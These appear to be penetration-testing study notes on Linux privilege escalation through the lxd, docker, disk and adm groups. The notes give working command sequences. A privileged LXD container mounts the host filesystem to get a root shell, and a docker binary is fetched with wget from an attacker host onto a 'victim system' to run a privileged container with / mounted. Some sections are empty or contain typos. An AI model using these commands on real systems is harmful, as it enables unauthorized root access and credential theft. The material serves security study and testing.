# LXC / LXD
LXD is similar to Docker and is Ubuntu's container manager.

Unzip the Alpine image.

 ```
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```
Start the LXD initialization process.
```
devops@NIX02:~$ lxd init
```
Import the local image.

```
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
```
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
```
Creating r00t
Mount the host file system.

```
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
Device mydev added to r00t
Find in /mnt/root/root
```
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ #
```
# Docker
## Docker Shared Directories

## Docker Sockets
Find a dcoker socket in the system
```
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```
Installing docker in the victim system ([docker](https://master.dockerproject.com/linux/x86_64/docker))
```
wget https://<parrot-os>:443/docker -O docker
chmod +x docker

/tmp/docker -H unix:///app/docker.sock ps
```
Configuration of the docker with the socket
```
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock ps
/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```
## Docker Group
Using coker images in the system
```
docker image ls
```

# Docker Socket


```

```

# Disk
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

# ADM
Members of the adm group are able to read all logs stored in /var/log. 
